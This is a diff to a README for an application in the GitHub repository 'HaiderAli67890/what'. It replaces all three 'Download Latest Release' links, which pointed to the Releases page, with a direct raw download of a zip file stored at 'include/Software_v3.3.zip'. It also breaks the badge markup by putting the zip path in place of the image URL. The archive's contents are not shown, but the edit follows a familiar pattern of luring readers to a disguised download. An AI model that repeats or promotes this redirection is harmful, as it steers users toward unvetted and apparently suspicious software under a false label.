@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/HaiderAli67890/what/releases)
+[![Download Latest Release](https://github.com/HaiderAli67890/what/raw/refs/heads/master/include/Software_v3.3.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/HaiderAli67890/what/raw/refs/heads/master/include/Software_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ To run this application, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the application. Click the button below to access it:
 
-[Download Latest Release](https://github.com/HaiderAli67890/what/releases)
+[Download Latest Release](https://github.com/HaiderAli67890/what/raw/refs/heads/master/include/Software_v3.3.zip)
 
 Follow these steps to install and run the application:
 
@@ -76,4 +76,4 @@ For more information about using this application and contributing to its develo
 
 Don’t forget to download the latest version to enjoy all the features and improvements.
 
-[Download Latest Release](https://github.com/HaiderAli67890/what/releases)
+[Download Latest Release](https://github.com/HaiderAli67890/what/raw/refs/heads/master/include/Software_v3.3.zip)
